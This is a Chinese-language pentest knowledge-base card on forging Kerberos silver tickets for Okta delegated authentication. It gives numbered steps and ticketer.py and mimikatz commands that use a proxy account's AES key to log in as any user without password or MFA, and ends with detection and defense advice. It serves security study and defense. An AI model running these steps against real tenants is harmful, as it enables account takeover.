---
id: cloud-cloud-iam-okta-delegated-auth-silver-ticket-aes-any-user
title: Okta 委托认证 Silver Ticket：用代理账户 AES 密钥为任意用户伪造 TGS，浏览器提交即认证为受害者
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: okta-delegated-auth-silver-ticket-aes-arbitrary-user
tags:
- okta
- cloud-iam
- kerberos
- silver-ticket
- aes
- impersonation
- mfa-bypass
- active-directory
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V433
  verified_at: '2026-11-09T20:12:55+08:00'
  notes: 已对照原文与截图核对：代理账户 SPN 为 HTTP/example.kerberos.okta.com、账号仅勾选 AES128/256、ticketer.py 以 -aesKey/-domain-sid/-user-id 1118 伪造 testuser 票据生成 ccache、浏览器提交 Okta；原文明确 Okta 只支持 AES 加密票据。未验证点：未实际运行 ticketer，票据提交后的 Okta 响应以原文截图为准。
url: /docs/cloud/cloud-iam/cloud-cloud-iam-okta-delegated-auth-silver-ticket-aes-any-user/
draft: false
kb_aliases:
- Okta Silver Ticket
- 白银票据 Okta
- AES 密钥伪造 TGS
- agentlessDSSO 伪造
- Okta 任意用户登录
---

## 一句话结论

拿到 Okta 委托认证所用 AD 代理账户的 AES 密钥（或明文口令）后，可用 ticketer.py 离线伪造任意用户（指定用户名与 RID）的 `HTTP/<tenant>.kerberos.okta.com` 服务票据；把票据注入浏览器再提交给 Okta，即可以受害者身份登录 Okta，不需要受害者口令、也不需要 MFA。

## 原理

- 白银票据的本质：服务票据由服务账户密钥加密，服务端（这里是 Okta）用自己保存的代理账户密钥解密，并信任 PAC 中携带的用户身份，不回 KDC 校验。因此任何持有同一密钥的人都能为任意用户名/RID 伪造票据。
- Okta 只支持 AES 加密的 Kerberos 票据，所以需要代理账户的 AES128/256 密钥或明文口令；仅有 NTLM Hash/RC4 无法生成 Okta 接受的票据。
- ticketer.py 使用 `-aesKey` 直接构造 TGS：`-user-id` 写入受害者 RID，`-spn` 指定 Okta 的 HTTP SPN，最终生成 `.ccache`；PAC 中的身份完全由攻击者控制。
- 票据经浏览器（Intranet 区 + SPNEGO）发给 Okta，Okta 解密验证通过后即建立受害者会话；整个过程不触发受害者的口令校验与 MFA。
- 与合法 TGS 注入的区别：合法注入只能代表自己，且需要向 KDC 申请；本方式不需要 KDC、不需要目标用户存在可登录凭据，只要密钥和 RID 正确。

## 触发条件

- 目标 Okta 租户启用委托认证，存在 `HTTP/<tenant>.kerberos.okta.com` 代理账户。
- 已获取该代理账户的 AES 密钥或明文口令（Kerberoasting 破解、凭据泄露、配置文件等）。
- 知道域名、域 SID、受害者 RID（域内用户属性可查）。
- 能注入票据并把票据提交给 Okta（受控浏览器/主机）。

## 利用步骤

1. 定位代理账户并获取密钥：对其发起 Kerberoasting 后离线破解口令，或从凭据泄露中直接拿到明文口令/AES key。
2. 伪造票据：`ticketer.py -domain-sid <SID> -domain <domain> -dc-ip <DC_IP> -aesKey <AES_KEY> -user-id <victim_RID> -spn HTTP/<tenant>.kerberos.okta.com <victim_user>`，输出 `<victim>.ccache`。
3. 注入票据：Rubeus `ptt` 或 mimikatz `kerberos::ptt`，并确保 `<tenant>.kerberos.okta.com` 在 Intranet 安全区域。
4. 访问 `https://<tenant>.kerberos.okta.com/api/internal/v1/agentlessDssoPrecheck` 验证 `{"result":"OK"}`，再打开 Okta 仪表盘，即应以受害者身份登录。

## PoC

```bash
# 伪造任意用户的 Okta 服务票据（AES 密钥来自被拿下的代理账户）
ticketer.py -domain-sid <DOMAIN_SID> -domain <DOMAIN> -dc-ip <DC_IP> \
  -aesKey <AES256_KEY> -user-id <VICTIM_RID> \
  -spn HTTP/<tenant>.kerberos.okta.com <victim_user>
# 得到 <victim_user>.ccache

# 注入（mimikatz）
# kerberos::purge
# kerberos::ptt <victim_user>.ccache
```

## 变体与关联

- 与 [[pentest-ad-silver-ticket-service-hash-forge-tgs]] 对比：同为用服务账户密钥离线伪造 TGS，但那是在域内访问 SMB/HTTP 等服务、用 NTLM Hash/RC4；本卡目标是云 IdP 的 HTTP SPN，必须 AES 密钥，票据经浏览器提交给 Okta 换取云会话，且受害者可为任意 Okta 用户。
- 关联 [[cloud-cloud-iam-okta-agentless-dsso-kerberos-tgs-login]]：前序的委托认证发现与合法票据注入流程。
- 边界：RC4/NTLM Hash 不能用于 Okta；代理账户密钥轮换后旧票据失效；票据仍受 Kerberos 生命周期限制，过期需重签。

## 检测与防御

- 域内：监控对 `HTTP/<tenant>.kerberos.okta.com` 的 TGS 请求与 4769 事件，尤其是非常规账户、异常来源主机与 AES 票据；对代理账户做 Kerberoasting 检测（短时间内大量 TGS 请求）。
- Okta 侧：审计 Kerberos 登录事件与 AD 侧登录日志的对应关系，发现“AD 无对应认证但 Okta 有登录”的差异即告警。
- 防御：不启用委托认证或收紧其使用范围；代理账户使用 gMSA、强随机密钥并定期轮换；限制能读取服务账户密钥的主体；对委托认证登录强制第二因素。
